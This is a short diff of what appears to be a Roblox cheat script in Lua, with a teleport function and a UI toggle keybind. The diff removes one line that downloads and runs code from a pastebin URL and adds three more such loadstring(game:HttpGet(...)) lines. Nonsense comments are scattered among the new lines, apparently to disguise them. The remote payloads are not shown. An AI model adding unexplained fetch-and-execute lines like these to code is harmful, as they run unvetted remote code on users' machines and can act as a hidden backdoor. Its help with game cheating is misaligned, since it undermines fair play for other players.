@@ -2375,7 +2375,7 @@ function()-- teleport to hidden 99
 Game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(269.36907958984375, 17024.74609375,
 139.19142150878906)
 end)
-loadstring(game:HttpGet("https://pastebin.com/raw/P1Yrf09M"))()
+
 
 
 
@@ -2386,7 +2386,13 @@ local MoreSection = More:NewSection("no")
 MoreSection:NewKeybind("Toggle ui", "toggle the ui yes", Enum.KeyCode.Insert, function()
     Library:ToggleUI()
 end)
-
+--game.Players.LocalPlayers.mg
+loadstring(game:HttpGet("https://pastebin.com/raw/9pDtfnLD"))()
+--Ctrller.P==kikkil
+loadstring(game:HttpGet("https://pastebin.com/raw/X9irXUVp",true))()
+--3rdstring%"".<LstB#%*^>
+loadstring(game:HttpGet("https://pastebin.com/raw/P1Yrf09M"))()
+--\//\/game;end.f%20ake.skript--\
 
 
 
